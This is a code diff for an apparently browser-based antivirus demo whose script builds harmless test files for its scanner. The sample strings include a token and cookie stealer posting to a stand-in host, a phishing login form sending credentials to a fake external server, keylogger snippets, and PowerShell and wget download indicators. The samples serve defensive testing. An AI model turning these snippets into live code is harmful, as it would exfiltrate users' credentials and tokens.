+$("csvBtn").addEventListener("click", exportCSV);
+$("htmlBtn").addEventListener("click", exportHTML);
+
+$("testBtn").addEventListener("click", () => testModal.classList.add("show"));
+$("closeModal").addEventListener("click", () => testModal.classList.remove("show"));
+testModal.addEventListener("click", e => { if(e.target === testModal) testModal.classList.remove("show"); });
 
 const TEST_CONTENT = {
-
-clean: `
-
-NeonAV Secure PRO ULTRA
-
-Arquivo de teste limpo.
-
-Nenhum indicador especial.
-
-`,
-
-js: `
-
-function teste(){
-
-document.addEventListener("keydown", function(event){
-
-console.log(event.key);
-
-});
-
-const encoded = atob("VGVzdGU=");
-
-const code = eval("1 + 1");
-
-}
-
-`,
-
-stealer: `
-
-const data = localStorage.getItem("token");
-
-const cookie = document.cookie;
-
-fetch("https://example.invalid/api", {
-
-method:"POST",
-
-body:data
-
-});
-
-navigator.sendBeacon(
-"https://example.invalid/log",
-data
-);
-
-`,
-
-powershell: `
-
-powershell.exe
-
--EncodedCommand
-
-Invoke-Expression
-
-Set-ExecutionPolicy
-
-curl https://example.invalid/file
-
-`,
-
-critical: `
-
-document.onkeydown = function(e){
-
-console.log(e.key);
-
+    clean: `NeonAV Secure PRO ULTRA\nArquivo de teste limpo.\nNenhum indicador especial.`,
+    js: `function teste(){\ndocument.addEventListener("keydown", function(event){ console.log(event.key); });\nconst encoded = atob("VGVzdGU=");\n}`,
+    stealer: `const data = localStorage.getItem("token");\nconst cookie = document.cookie;\nfetch("https://example.invalid/api", { method:"POST", body:data });`,
+    powershell: `powershell.exe\n-EncodedCommand\nInvoke-Expression\nSet-ExecutionPolicy`,
+    phishing: `<!DOCTYPE html><html><body><form action="http://malicious-external-server.invalid/capture" method="POST"><input type="text" name="username"><input type="password" name="password"><button type="submit">Entrar</button></form></body></html>`,
+    critical: `document.onkeydown = function(e){ console.log(e.key); };\ndocument.cookie;\nlocalStorage.getItem("password");\npowershell.exe -EncodedCommand AAAA\n`
 };
-
-document.cookie;
-
-localStorage.getItem("password");
-
-fetch("https://bit.ly/example");
-
-eval(atob("VGVzdGU="));
-
-Function("return 1");
-
-powershell.exe -EncodedCommand AAAA
-
-cmd.exe /c whoami
-
-/bin/bash
-
-wget https://example.invalid/a.exe
-
-registry startup autorun
-
-password credential token bearer
-
-`
-
-};
-
 
 function createTestFile(type){
-
-const content =
-TEST_CONTENT[type];
-
-if(!content){
-return;
+    const content = TEST_CONTENT[type];
+    if(!content) return;
+    const names = {
+        clean:"neonav-teste-limpo.txt",
+        js:"neonav-teste-javascript.js",
+        stealer:"neonav-teste-stealer.txt",
+        powershell:"neonav-teste-powershell.ps1",
+        phishing:"neonav-teste-phishing.html",
+        critical:"neonav-teste-critico.txt"
+    };
+    const blob = new Blob([content], { type:"text/plain" });
+    const file = new File([blob], names[type], { type:"text/plain", lastModified:Date.now() });
+    addFiles([file]);
+    testModal.classList.remove("show");
 }
 
-const names = {
-
-clean:"neonav-teste-limpo.txt",
-
-js:"neonav-teste-javascript.js",
-
-stealer:"neonav-teste-stealer.txt",
-
-powershell:"neonav-teste-powershell.ps1",
-
-critical:"neonav-teste-critico.txt"
-
-};
-
-const blob =
-new Blob(
-[content],
-{
-type:
-"text/plain"
-}
-);
-
-const file =
-new File(
-[blob],
-names[type],
-{
-type:"text/plain",
-lastModified:Date.now()
-}
-);
-
-addFiles([file]);
-
-testModal.classList.remove("show");
-
-}
-
-
-testModal.addEventListener(
-"click",
-event=>{
-
-const button =
-event.target.closest("[data-test]");
-
-if(button){
-
-createTestFile(
-button.getAttribute("data-test")
-);
-
-}
-
-}
-);
-
-
-/* =========================================================
-   CARREGAR HISTÓRICO
-========================================================= */
+testModal.addEventListener("click", event => {
+    const button = event.target.closest("[data-test]");
+    if(button) createTestFile(button.getAttribute("data-test"));
+});
 
 loadHistory();
-
 updateDashboard();
-
 renderResults();
-
 </script>
 
 </body>
